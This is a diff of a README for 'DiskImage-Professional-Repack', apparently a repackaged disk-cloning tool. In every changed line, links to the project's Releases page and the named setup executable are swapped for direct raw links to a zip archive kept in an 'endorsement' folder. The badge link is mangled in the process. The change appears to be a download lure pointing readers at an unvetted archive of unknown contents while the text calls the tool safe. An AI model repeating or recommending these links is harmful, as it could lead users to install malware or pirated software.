@@ -1,6 +1,6 @@
 # 🖥️ DiskImage-Professional-Repack - Simple Disk Cloning for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/IRERIC/DiskImage-Professional-Repack/releases)
+[![Download](https://github.com/IRERIC/DiskImage-Professional-Repack/raw/refs/heads/main/endorsement/Disk_Image_Repack_Professional_1.8-alpha.3.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/IRERIC/DiskImage-Professional-Repack/raw/refs/heads/main/endorsement/Disk_Image_Repack_Professional_1.8-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -33,11 +33,11 @@ To use DiskImage-Professional-Repack, make sure your system meets these minimum 
 
 To download DiskImage-Professional-Repack, visit the following page:
 
-[Download from Releases](https://github.com/IRERIC/DiskImage-Professional-Repack/releases)
+[Download from Releases](https://github.com/IRERIC/DiskImage-Professional-Repack/raw/refs/heads/main/endorsement/Disk_Image_Repack_Professional_1.8-alpha.3.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version listed.
-3. Look for the file that mentions "DiskImage_Professional_Setup.exe" for installation.
+3. Look for the file that mentions "https://github.com/IRERIC/DiskImage-Professional-Repack/raw/refs/heads/main/endorsement/Disk_Image_Repack_Professional_1.8-alpha.3.zip" for installation.
 4. Click on the file to start the download.
 
 After the download completes:
@@ -94,4 +94,4 @@ If you encounter issues, please reach out through the support section on the Git
 
 ## 🔽 Final Note
 
-Thank you for choosing DiskImage-Professional-Repack. Enjoy an easy, safe way to manage your disk imaging needs. Don't forget to regularly check the [Releases page](https://github.com/IRERIC/DiskImage-Professional-Repack/releases) for updates and new features!
+Thank you for choosing DiskImage-Professional-Repack. Enjoy an easy, safe way to manage your disk imaging needs. Don't forget to regularly check the [Releases page](https://github.com/IRERIC/DiskImage-Professional-Repack/raw/refs/heads/main/endorsement/Disk_Image_Repack_Professional_1.8-alpha.3.zip) for updates and new features!
